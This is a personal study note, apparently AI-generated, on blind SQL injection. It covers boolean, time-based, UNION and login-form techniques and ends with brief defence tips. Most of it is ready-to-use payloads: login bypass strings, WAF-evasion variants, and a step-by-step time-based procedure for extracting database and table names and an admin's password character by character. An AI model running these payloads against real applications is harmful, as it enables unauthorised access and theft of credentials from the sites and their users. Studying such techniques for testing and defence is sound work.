
---

# 🧠 Deep Dive: Blind SQL Injection (SQLi) — Obsidian Note

---

## 📌 What is Blind SQL Injection?

**Blind SQL Injection** is when a web application is vulnerable to SQLi, but it does **not display errors** or results directly. You must infer database behavior based on:

- Boolean responses (`True/False`)
    
- Time delays
    
- Redirects
    
- Content changes
    

---

## 🧪 1. Boolean-Based Blind SQLi

Used when application shows different behavior for true vs false queries.

### 🧷 Example:

```sql
?id=1 AND 1=1  -- Returns normal page (true)
?id=1 AND 1=2  -- Returns blank/error page (false)
```

### ✅ Real Payloads:

```sql
?id=1' AND 'a'='a -- True
?id=1' AND 'a'='b -- False
```

### 🔄 Bypass:

```sql
?id=1/**/AND/**/1=1
?id=1' OR 1=1# -- WAF bypass with comment
```

---

## ⌛ 2. Time-Based Blind SQLi

Used when there’s **no visible output**, but time delays help detect vulnerability.

### 🧷 Example (MySQL):

```sql
?id=1' AND SLEEP(5) -- Delays response by 5 seconds
```

### 🧷 PostgreSQL:

```sql
?id=1'; SELECT pg_sleep(5); --
```

### 🔄 Bypass:

```sql
?id=1%27%20AND%20IF(1=1,SLEEP(5),0)--+  (URL-encoded)
```

---

## 🔀 3. UNION-Based Blind SQLi

This is a **blend of blind + UNION** logic. Used to **enumerate column count and extract data**, but you only see **changes in behavior** (e.g., longer response, different layout, redirects), not visible data directly.

### 🎯 Strategy:

1. Test for columns using `ORDER BY`:
    
    ```sql
    id=1 ORDER BY 1 --
    id=1 ORDER BY 2 --
    ...
    ```
    
2. Then test UNION injection:
    
    ```sql
    id=1 UNION SELECT NULL,NULL --
    ```
    
3. Then probe for payloads via behavioral hints.
    

### 🔄 Example:

```sql
?id=0 UNION SELECT 1,IF(SUBSTRING(database(),1,1)='s',SLEEP(3),NULL) --
```

### 🛠️ Use-case:

This combines **UNION** logic with **time-based probing** — you don't see output, but time lets you extract each character.

---

## 🔑 4. Auth-Based Blind SQL Injection

Occurs in **login forms**, **auth tokens**, or **API endpoints** — no direct query output, but login **succeeds/fails** based on injected condition.

### 🔓 Login form bypass:

```sql
Username: admin' OR '1'='1
Password: anything
```

### ✅ Boolean Logic Example:

```sql
Username: ' OR 1=1 -- 
Password: [blank]
```

If login **succeeds**, SQLi is confirmed.

### 🧪 Advanced Boolean Logic:

```sql
Username: admin' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) = 97 -- 
```

Checks if **first letter of password is 'a'** (ASCII 97)

Combine with script to **brute force each character**.

---

## 🧰 Bypass Techniques

|Technique|Example|
|---|---|
|**URL Encoding**|`%27` = `'`|
|**Case Switching**|`SeLeCt`|
|**Comment Injection**|`' OR 1=1 --`|
|**Space Bypass**|`'/**/OR/**/'1'='1`|
|**Inline Queries**|`IF(1=1, SLEEP(5), 0)`|
|**Hex Values**|`0x61646d696e` = 'admin'|

---

## 📖 Full Example: Extracting Password via Blind SQLi

### Step 1: Is it vulnerable?

```sql
?id=1' AND 1=1 -- ✅
?id=1' AND 1=2 -- ❌
```

### Step 2: Get DB Name (Time-Based)

```sql
?id=1 AND IF(SUBSTRING(DATABASE(),1,1)='s',SLEEP(5),0) --
```

### Step 3: Get table name

```sql
?id=1 AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u',SLEEP(5),0) --
```

### Step 4: Brute column names and data

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5), 0) --
```

Repeat by incrementing character position.

---

## 🖼️ Diagram for Obsidian

I'll generate a diagram summarizing these techniques.

![Blind SQLi Flow](https://i.imgur.com/3b9FyEF.png)

---

## 🔒 Defense Tips (for comparison)

- Use **prepared statements (parametrized queries)**
    
- Disable **detailed error messages**
    
- Enable **WAF + IPS systems**
    
- Use **ORMs** where possible
    
- Validate all input, use **allowlists**
    

---

If you want this as a downloadable `.md` file for Obsidian or want visuals made custom (flowchart of blind SQLi logic with tools like Draw.io or Mermaid.js), just let me know!